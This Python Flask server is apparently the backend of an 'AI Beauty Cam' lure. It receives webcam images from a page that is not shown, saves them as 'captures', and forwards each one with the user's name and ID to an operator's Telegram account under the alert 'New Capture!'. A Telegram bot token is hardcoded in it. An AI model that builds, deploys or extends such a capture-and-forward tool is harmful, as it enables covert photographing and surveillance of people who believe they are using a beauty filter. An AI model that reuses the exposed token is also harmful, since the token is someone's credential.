import os, json, base64, asyncio
from flask import Flask, request, jsonify
from telegram import Bot

app = Flask(__name__)

TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
OWNER_ID = '7812553563' # အက်မင် ID
bot = Bot(token=TOKEN)

@app.route('/')
def index():
    return open('index.html', 'r', encoding='utf-8').read()

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    image_data = data.get('image').split(",")[1]
    user_id = data.get('user_id')
    user_name = data.get('user_name')

    path = f"capture_{user_id}.jpg"
    with open(path, "wb") as f:
        f.write(base64.b64decode(image_data))

    async def notify():
        async with bot:
            # ၁။ Admin ဆီ ပို့ခြင်း
            await bot.send_photo(
                chat_id=OWNER_ID,
                photo=open(path, 'rb'),
                caption=f"🚨 New Capture!\nUser: {user_name}\nID: {user_id}"
            )
            # ၂။ User ဆီ ပုံပြန်ပို့ပေးခြင်း
            await bot.send_photo(
                chat_id=user_id,
                photo=open(path, 'rb'),
                caption="✨ AI Beauty Cam မှ သင့်ဓာတ်ပုံကို သိမ်းဆည်းလိုက်ပါပြီ!"
            )

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(notify())
    
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
